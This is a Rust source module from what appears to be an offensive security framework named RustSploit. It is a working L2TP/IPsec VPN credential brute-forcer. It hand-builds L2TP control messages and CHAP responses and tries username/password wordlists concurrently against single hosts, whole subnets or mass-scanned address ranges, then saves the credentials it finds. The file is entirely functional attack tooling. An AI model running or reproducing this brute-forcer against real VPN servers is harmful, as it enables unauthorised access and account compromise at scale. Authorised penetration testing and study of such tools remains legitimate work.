use anyhow::{anyhow, Result};
use colored::*;
use std::{io::Write, net::UdpSocket, time::Duration};

use crate::modules::creds::utils::{
    generate_combos_mode, parse_combo_mode, load_credential_file,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file, cfg_prompt_port,
    cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "L2TP Brute Force".to_string(),
        description: "Brute-force L2TP/IPsec VPN authentication via CHAP handshake. Tests credentials against L2TP concentrators with concurrent connections and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

const DEFAULT_L2TP_PORT: u16 = 1701;
const DEFAULT_TIMEOUT_MS: u64 = 5000;

// L2TP Message Types
const L2TP_SCCRQ: u16 = 1; // Start-Control-Connection-Request
const L2TP_SCCRP: u16 = 2; // Start-Control-Connection-Reply
const L2TP_SCCCN: u16 = 3; // Start-Control-Connection-Connected
const L2TP_ICRQ: u16 = 10; // Incoming-Call-Request
const L2TP_ICRP: u16 = 11; // Incoming-Call-Reply
const L2TP_ICCN: u16 = 12; // Incoming-Call-Connected

// PPP Protocol IDs
const PPP_CHAP: u16 = 0xC223;

// CHAP Codes
const CHAP_CHALLENGE: u8 = 1;
const CHAP_RESPONSE: u8 = 2;
const CHAP_SUCCESS: u8 = 3;
const CHAP_FAILURE: u8 = 4;

fn display_banner() {
    crate::mprintln!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   L2TP/PPP Brute Force Module                             ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Native L2TP/CHAP Implementation                         ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Tests against L2TP servers using CHAP authentication    ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

/// L2TP Session state
struct L2tpSession {
    sock: UdpSocket,
    local_tunnel_id: u16,
    remote_tunnel_id: u16,
    local_session_id: u16,
    remote_session_id: u16,
    ns: u16, // Next sequence to send
    nr: u16, // Next sequence expected
}

impl L2tpSession {
    fn new(sock: UdpSocket) -> Self {
        Self {
            sock,
            local_tunnel_id: rand::random::<u16>() | 1,
            remote_tunnel_id: 0,
            local_session_id: rand::random::<u16>() | 1,
            remote_session_id: 0,
            ns: 0,
            nr: 0,
        }
    }

    /// Build L2TP control message
    fn build_control(&mut self, avps: &[u8]) -> Vec<u8> {
        // Flags: T=1 (control), L=1 (length), S=1 (sequence)
        let flags: u16 = 0xC802;
        let length = 12 + avps.len() as u16;

        let mut pkt = Vec::with_capacity(length as usize);
        pkt.extend_from_slice(&flags.to_be_bytes());
        pkt.extend_from_slice(&length.to_be_bytes());
        pkt.extend_from_slice(&self.remote_tunnel_id.to_be_bytes());
        pkt.extend_from_slice(&0u16.to_be_bytes()); // Session 0 for control
        pkt.extend_from_slice(&self.ns.to_be_bytes());
        pkt.extend_from_slice(&self.nr.to_be_bytes());
        pkt.extend_from_slice(avps);

        self.ns = self.ns.wrapping_add(1);
        pkt
    }

    /// Build L2TP data message
    fn build_data(&self, payload: &[u8]) -> Vec<u8> {
        let flags: u16 = 0x0002; // Data message

        let mut pkt = Vec::with_capacity(6 + payload.len());
        pkt.extend_from_slice(&flags.to_be_bytes());
        pkt.extend_from_slice(&self.remote_tunnel_id.to_be_bytes());
        pkt.extend_from_slice(&self.remote_session_id.to_be_bytes());
        pkt.extend_from_slice(payload);
        pkt
    }

    /// Build AVP (Attribute-Value Pair)
    fn build_avp(attr_type: u16, value: &[u8], mandatory: bool) -> Vec<u8> {
        let flags = if mandatory { 0x8000 } else { 0 } | (6 + value.len() as u16);
        let mut avp = Vec::with_capacity(6 + value.len());
        avp.extend_from_slice(&flags.to_be_bytes());
        avp.extend_from_slice(&0u16.to_be_bytes()); // Vendor ID = 0
        avp.extend_from_slice(&attr_type.to_be_bytes());
        avp.extend_from_slice(value);
        avp
    }

    /// Send SCCRQ (Start-Control-Connection-Request)
    fn send_sccrq(&mut self) -> Result<()> {
        let mut avps = Vec::new();
        // Message Type = SCCRQ
        avps.extend(Self::build_avp(0, &L2TP_SCCRQ.to_be_bytes(), true));
        // Protocol Version = 1.0
        avps.extend(Self::build_avp(2, &[0x01, 0x00], true));
        // Host Name
        avps.extend(Self::build_avp(3, b"RustSploit-L2TP", true));
        // Assigned Tunnel ID
        avps.extend(Self::build_avp(
            9,
            &self.local_tunnel_id.to_be_bytes(),
            true,
        ));
        // Receive Window Size
        avps.extend(Self::build_avp(10, &1500u16.to_be_bytes(), true));

        let pkt = self.build_control(&avps);
        self.sock.send(&pkt)?;
        Ok(())
    }

    /// Send SCCCN (Start-Control-Connection-Connected)
    fn send_scccn(&mut self) -> Result<()> {
        let mut avps = Vec::new();
        avps.extend(Self::build_avp(0, &L2TP_SCCCN.to_be_bytes(), true));

        let pkt = self.build_control(&avps);
        self.sock.send(&pkt)?;
        Ok(())
    }

    /// Send ICRQ (Incoming-Call-Request)
    fn send_icrq(&mut self) -> Result<()> {
        let mut avps = Vec::new();
        avps.extend(Self::build_avp(0, &L2TP_ICRQ.to_be_bytes(), true));
        avps.extend(Self::build_avp(
            14,
            &self.local_session_id.to_be_bytes(),
            true,
        ));
        avps.extend(Self::build_avp(
            15,
            &rand::random::<u32>().to_be_bytes(),
            true,
        )); // Call Serial Number

        let pkt = self.build_control(&avps);
        self.sock.send(&pkt)?;
        Ok(())
    }

    /// Send ICCN (Incoming-Call-Connected)
    fn send_iccn(&mut self) -> Result<()> {
        let mut avps = Vec::new();
        avps.extend(Self::build_avp(0, &L2TP_ICCN.to_be_bytes(), true));
        avps.extend(Self::build_avp(24, &1000000u32.to_be_bytes(), true)); // Tx Connect Speed
        avps.extend(Self::build_avp(19, &0u32.to_be_bytes(), true)); // Framing Type

        let pkt = self.build_control(&avps);
        self.sock.send(&pkt)?;
        Ok(())
    }

    /// Send CHAP Response
    fn send_chap_response(
        &self,
        identifier: u8,
        challenge: &[u8],
        username: &str,
        password: &str,
    ) -> Result<()> {
        // Compute CHAP hash: MD5(identifier + password + challenge)
        let mut data = Vec::with_capacity(1 + password.len() + challenge.len());
        data.push(identifier);
        data.extend_from_slice(password.as_bytes());
        data.extend_from_slice(challenge);
        let hash = md5::compute(&data);

        // Build CHAP Response packet
        let name_bytes = username.as_bytes();
        let length: u16 = 4 + 1 + 16 + name_bytes.len() as u16;

        let mut chap = Vec::new();
        chap.push(CHAP_RESPONSE);
        chap.push(identifier);
        chap.extend_from_slice(&length.to_be_bytes());
        chap.push(16); // Value size (MD5 = 16 bytes)
        chap.extend_from_slice(&hash.0);
        chap.extend_from_slice(name_bytes);

        // Wrap in PPP frame
        let mut ppp = Vec::new();
        ppp.extend_from_slice(&[0xFF, 0x03]); // Address + Control
        ppp.extend_from_slice(&PPP_CHAP.to_be_bytes());
        ppp.extend_from_slice(&chap);

        let pkt = self.build_data(&ppp);
        self.sock.send(&pkt)?;
        Ok(())
    }

    /// Receive and parse L2TP packet
    fn recv_packet(&self, timeout: Duration) -> Result<L2tpPacket> {
        self.sock.set_read_timeout(Some(timeout))?;

        let mut buf = [0u8; 4096];
        let n = self.sock.recv(&mut buf)?;

        if n < 6 {
            return Err(anyhow!("Packet too short"));
        }

        let flags = u16::from_be_bytes([buf[0], buf[1]]);
        let is_control = (flags & 0x8000) != 0;
        let has_length = (flags & 0x4000) != 0;
        let has_sequence = (flags & 0x0800) != 0;

        let mut offset = 2;

        if has_length {
            offset += 2;
        }

        let tunnel_id = u16::from_be_bytes([buf[offset], buf[offset + 1]]);
        offset += 2;
        let session_id = u16::from_be_bytes([buf[offset], buf[offset + 1]]);
        offset += 2;

        if has_sequence {
            offset += 4; // Ns + Nr
        }

        let payload = buf[offset..n].to_vec();

        Ok(L2tpPacket {
            is_control,
            _tunnel_id: tunnel_id,
            _session_id: session_id,
            payload,
        })
    }

    /// Parse control message type from AVPs
    fn parse_message_type(payload: &[u8]) -> Option<u16> {
        let mut offset = 0;
        while offset + 6 <= payload.len() {
            let avp_flags = u16::from_be_bytes([payload[offset], payload[offset + 1]]);
            let avp_len = (avp_flags & 0x03FF) as usize;

            // Minimum AVP is 6 bytes (header). Zero-length = malformed, break to avoid infinite loop.
            if avp_len < 6 || offset + avp_len > payload.len() {
                break;
            }

            let vendor_id = u16::from_be_bytes([payload[offset + 2], payload[offset + 3]]);
            let attr_type = u16::from_be_bytes([payload[offset + 4], payload[offset + 5]]);

            if vendor_id == 0 && attr_type == 0 && avp_len >= 8 {
                return Some(u16::from_be_bytes([
                    payload[offset + 6],
                    payload[offset + 7],
                ]));
            }

            offset += avp_len;
        }
        None
    }

    /// Parse assigned tunnel/session ID from AVPs
    fn parse_assigned_id(payload: &[u8], attr_type: u16) -> Option<u16> {
        let mut offset = 0;
        while offset + 6 <= payload.len() {
            let avp_flags = u16::from_be_bytes([payload[offset], payload[offset + 1]]);
            let avp_len = (avp_flags & 0x03FF) as usize;

            // Minimum AVP is 6 bytes. Zero/small length = malformed, break to avoid infinite loop.
            if avp_len < 6 || offset + avp_len > payload.len() {
                break;
            }

            let vendor_id = u16::from_be_bytes([payload[offset + 2], payload[offset + 3]]);
            let avp_type = u16::from_be_bytes([payload[offset + 4], payload[offset + 5]]);

            if vendor_id == 0 && avp_type == attr_type && avp_len >= 8 {
                return Some(u16::from_be_bytes([
                    payload[offset + 6],
                    payload[offset + 7],
                ]));
            }

            offset += avp_len;
        }
        None
    }
}

struct L2tpPacket {
    is_control: bool,
    _tunnel_id: u16,
    _session_id: u16,
    payload: Vec<u8>,
}

/// Main L2TP bruteforce entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    crate::mprintln!("[*] Target: {}", target);

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} — Mass Scan Mode", target).yellow()
        );
        return run_mass_scan(
            target,
            MassScanConfig {
                protocol_name: "L2TP",
                default_port: 1701,
                state_file: "l2tp_hose_state.log",
                default_output: "l2tp_mass_results.txt",
                default_concurrency: 200,
            },
            move |ip, port| {
                async move {
                    // Quick UDP port check
                    let sock = crate::utils::udp_bind(None).await.ok()?;
                    let addr = format!("{}:{}", ip, port);
                    sock.connect(&addr).await.ok()?;
                    sock.send(&[0xc8, 0x02]).await.ok()?; // L2TP SCCRQ marker
                    let mut buf = [0u8; 256];
                    match tokio::time::timeout(
                        std::time::Duration::from_secs(3),
                        sock.recv(&mut buf),
                    )
                    .await
                    {
                        Ok(Ok(n)) if n > 0 => {
                            let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                            Some(format!("[{}] {}:{} L2TP responsive\n", ts, ip, port))
                        }
                        _ => None,
                    }
                }
            },
        )
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
        return run_l2tp_subnet_scan(target).await;
    }

    // --- Single Target Mode ---
    let port: u16 = cfg_prompt_port("port", "L2TP Port", DEFAULT_L2TP_PORT).await?;

    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let timeout_ms: u64 = {
        let input = cfg_prompt_default(
            "timeout_ms",
            "Connection timeout (ms)",
            &DEFAULT_TIMEOUT_MS.to_string(),
        )
        .await?;
        input
            .parse::<u64>()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .max(100)
            .min(30000)
    };

    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "l2tp_results.txt").await?)
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    let normalized = normalize_target(target)?;

    // Load wordlists
    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        return Err(anyhow!("Username wordlist is empty"));
    }
    crate::mprintln!(
        "{}",
        format!("[*] Loaded {} usernames", users.len()).green()
    );

    let passwords = load_lines(&passwords_file)?;
    if passwords.is_empty() {
        return Err(anyhow!("Password wordlist is empty"));
    }
    crate::mprintln!(
        "{}",
        format!("[*] Loaded {} passwords", passwords.len()).green()
    );

    // Test connectivity first
    let addr = format!("{}:{}", normalized, port);
    crate::mprintln!("\n[*] Testing L2TP server connectivity...");
    match test_l2tp_connectivity(&addr, Duration::from_millis(timeout_ms)).await {
        Ok(true) => crate::mprintln!("[+] L2TP server is responding"),
        Ok(false) => crate::mprintln!(
            "{}",
            "[!] L2TP server not responding to control messages".yellow()
        ),
        Err(e) => crate::mprintln!(
            "{}",
            format!("[!] Connectivity test failed: {}", e).yellow()
        ),
    }

    let mut combos = generate_combos_mode(&users, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }
    let timeout_duration = Duration::from_millis(timeout_ms);

    crate::mprintln!(
        "\n{}",
        format!("[*] Starting brute-force on {}", addr).cyan()
    );

    // Build the try_login closure for the bruteforce engine.
    // L2TP is UDP-based, so the actual login runs in spawn_blocking.
    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let timeout_dur = timeout_duration;
        async move {
            let login_addr = format!("{}:{}", t, p);
            match try_l2tp_login(&login_addr, &user, &pass, timeout_dur).await {
                Ok(true) => LoginResult::Success,
                Ok(false) => LoginResult::AuthFailed,
                Err(e) => {
                    let msg = e.to_string();
                    let retryable = msg.contains("timed out")
                        || msg.contains("WouldBlock")
                        || msg.contains("Resource temporarily unavailable");
                    LoginResult::Error {
                        message: msg,
                        retryable,
                    }
                }
            }
        }
    };

    let result = run_bruteforce(
        &BruteforceConfig {
            target: normalized,
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 0,
            max_retries: 2,
            service_name: "l2tp",
            jitter_ms: 0,
            source_module: "creds/generic/l2tp_bruteforce",
        },
        combos,
        try_login,
    )
    .await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored L2TP responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no(
            "save_unknown_responses",
            "Save unknown responses to file?",
            true,
        )
        .await?
        {
            let default_name = "l2tp_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )
            .await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# L2TP Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

/// Subnet scan using the engine's `run_subnet_bruteforce` with UDP support.
async fn run_l2tp_subnet_scan(target: &str) -> Result<()> {
    let port: u16 = cfg_prompt_port("port", "L2TP Port", DEFAULT_L2TP_PORT).await?;
    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
    let users = load_lines(&usernames_file)?;
    let passes = load_lines(&passwords_file)?;
    if users.is_empty() {
        return Err(anyhow!("Username wordlist is empty"));
    }
    if passes.is_empty() {
        return Err(anyhow!("Password wordlist is empty"));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let output_file = cfg_prompt_output_file(
        "output_file",
        "Output result file",
        "l2tp_subnet_results.txt",
    )
    .await?;

    let timeout_ms: u64 = {
        let input = cfg_prompt_default(
            "timeout_ms",
            "Connection timeout (ms)",
            &DEFAULT_TIMEOUT_MS.to_string(),
        )
        .await?;
        input
            .parse::<u64>()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .max(100)
            .min(30000)
    };
    let timeout_duration = Duration::from_millis(timeout_ms);

    run_subnet_bruteforce(
        target,
        port,
        users,
        passes,
        &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "l2tp",
            jitter_ms: 0,
            source_module: "creds/generic/l2tp_bruteforce",
            skip_tcp_check: true, // L2TP is UDP — no TCP pre-check
        },
        move |ip: std::net::IpAddr, port: u16, user: String, pass: String| {
            let timeout_dur = timeout_duration;
            async move {
                let addr = format!("{}:{}", ip, port);
                match try_l2tp_login(&addr, &user, &pass, timeout_dur).await {
                    Ok(true) => LoginResult::Success,
                    Ok(false) => LoginResult::AuthFailed,
                    Err(e) => {
                        let msg = e.to_string();
                        let retryable = msg.contains("timed out")
                            || msg.contains("WouldBlock")
                            || msg.contains("Resource temporarily unavailable");
                        LoginResult::Error {
                            message: msg,
                            retryable,
                        }
                    }
                }
            }
        },
    )
    .await
}

/// Test L2TP server connectivity
async fn test_l2tp_connectivity(addr: &str, timeout: Duration) -> Result<bool> {
    let result = tokio::task::spawn_blocking({
        let addr = addr.to_string();
        move || -> Result<bool> {
            let sock = crate::utils::blocking_udp_bind(None)?;
            sock.connect(&addr)?;
            sock.set_read_timeout(Some(timeout))?;
            sock.set_write_timeout(Some(timeout))?;

            let mut session = L2tpSession::new(sock);
            session.send_sccrq()?;

            match session.recv_packet(timeout) {
                Ok(pkt) => {
                    if pkt.is_control {
                        if let Some(msg_type) = L2tpSession::parse_message_type(&pkt.payload) {
                            return Ok(msg_type == L2TP_SCCRP);
                        }
                    }
                    Ok(false)
                }
                Err(_) => Ok(false),
            }
        }
    })
    .await?;
    result
}

/// Attempt L2TP login with credentials
async fn try_l2tp_login(
    addr: &str,
    username: &str,
    password: &str,
    timeout: Duration,
) -> Result<bool> {
    let addr = addr.to_string();
    let username = username.to_string();
    let password = password.to_string();

    tokio::task::spawn_blocking(move || try_l2tp_login_sync(&addr, &username, &password, timeout))
        .await?
}

/// Synchronous L2TP login attempt
fn try_l2tp_login_sync(
    addr: &str,
    username: &str,
    password: &str,
    timeout: Duration,
) -> Result<bool> {
    let sock = crate::utils::blocking_udp_bind(None)?;
    sock.connect(addr)?;
    sock.set_read_timeout(Some(timeout))?;
    sock.set_write_timeout(Some(timeout))?;

    let mut session = L2tpSession::new(sock);

    // Step 1: Send SCCRQ
    session.send_sccrq()?;

    // Step 2: Receive SCCRP
    let pkt = session.recv_packet(timeout)?;
    if !pkt.is_control {
        return Err(anyhow!("Expected control message, got data"));
    }

    match L2tpSession::parse_message_type(&pkt.payload) {
        Some(L2TP_SCCRP) => {
            if let Some(tid) = L2tpSession::parse_assigned_id(&pkt.payload, 9) {
                session.remote_tunnel_id = tid;
            }
            session.nr += 1;
        }
        Some(other) => return Err(anyhow!("Expected SCCRP, got message type {}", other)),
        None => return Err(anyhow!("No message type in response")),
    }

    // Step 3: Send SCCCN
    session.send_scccn()?;

    // Step 4: Send ICRQ
    session.send_icrq()?;

    // Step 5: Receive ICRP
    let pkt = session.recv_packet(timeout)?;
    if pkt.is_control {
        if let Some(L2TP_ICRP) = L2tpSession::parse_message_type(&pkt.payload) {
            if let Some(sid) = L2tpSession::parse_assigned_id(&pkt.payload, 14) {
                session.remote_session_id = sid;
            }
            session.nr += 1;
        }
    }

    // Step 6: Send ICCN
    session.send_iccn()?;

    // Step 7: Wait for CHAP Challenge
    let mut challenge_data: Option<(u8, Vec<u8>)> = None;

    for _ in 0..5 {
        match session.recv_packet(timeout) {
            Ok(pkt) => {
                if !pkt.is_control && pkt.payload.len() > 6 {
                    // Check for PPP CHAP
                    let mut offset = 0;
                    if pkt.payload[0] == 0xFF && pkt.payload[1] == 0x03 {
                        offset = 2;
                    }

                    if pkt.payload.len() > offset + 6 {
                        let protocol =
                            u16::from_be_bytes([pkt.payload[offset], pkt.payload[offset + 1]]);
                        if protocol == PPP_CHAP {
                            let chap_code = pkt.payload[offset + 2];
                            if chap_code == CHAP_CHALLENGE {
                                let identifier = pkt.payload[offset + 3];
                                let value_size = pkt.payload[offset + 6] as usize;
                                if pkt.payload.len() >= offset + 7 + value_size {
                                    let challenge =
                                        pkt.payload[offset + 7..offset + 7 + value_size].to_vec();
                                    challenge_data = Some((identifier, challenge));
                                    break;
                                }
                            }
                        }
                    }
                }
            }
            Err(_) => break,
        }
    }

    let (identifier, challenge) =
        challenge_data.ok_or_else(|| anyhow!("No CHAP challenge received"))?;

    // Step 8: Send CHAP Response
    session.send_chap_response(identifier, &challenge, username, password)?;

    // Step 9: Wait for CHAP Success/Failure
    for _ in 0..5 {
        match session.recv_packet(timeout) {
            Ok(pkt) => {
                if !pkt.is_control && pkt.payload.len() > 4 {
                    if pkt.payload.len() < 3 { continue; }
                    let mut offset = 0;
                    if pkt.payload[0] == 0xFF && pkt.payload[1] == 0x03 {
                        offset = 2;
                    }

                    if pkt.payload.len() > offset + 2 {
                        let protocol =
                            u16::from_be_bytes([pkt.payload[offset], pkt.payload[offset + 1]]);
                        if protocol == PPP_CHAP {
                            let chap_code = pkt.payload[offset + 2];
                            match chap_code {
                                CHAP_SUCCESS => return Ok(true),
                                CHAP_FAILURE => return Ok(false),
                                _ => continue,
                            }
                        }
                    }
                }
            }
            Err(_) => break,
        }
    }

    Err(anyhow!("No CHAP response received"))
}
